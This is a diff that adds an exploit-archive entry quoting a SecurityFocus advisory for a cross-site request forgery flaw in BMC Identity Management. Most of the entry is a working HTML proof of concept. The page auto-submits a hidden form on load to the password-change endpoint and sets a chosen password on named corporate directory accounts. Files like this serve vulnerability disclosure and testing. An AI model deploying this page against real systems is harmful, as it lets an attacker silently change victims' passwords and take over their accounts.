@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/53924/info
+
+Identity Management is prone to a cross-site request-forgery vulnerability because the application fails to properly validate HTTP requests.
+
+Exploiting this issue may allow a remote attacker to perform certain actions in the context of an authorized user's session and gain unauthorized access to the affected application; other attacks are also possible. 
+
+<html><head><title>BMC IDM Change PW CSRF PoC</title></head> <body onload="document.getElementById('CSRF').submit()"> <form action="https://xxx.xxx.xxx.xxx/idm/password-manager/changePasswords.do"; method="post" id="CSRF"> <input type="hidden" name="colChkbx_Tab1" value="CN=Test User,OU=User Accounts,DC=corporate,DC=business,DC=com corporate Win2000" /> <input type="hidden" name="password" value="Abc123!" /> <input type="hidden" name="passwordAgain" value="Abc123!" /> <input type="hidden" name="selAccts" value="CN=user Name,OU=User Accounts,DC=corporate,DC=business,DC=com corporate Win2000" /> </form></body></html>
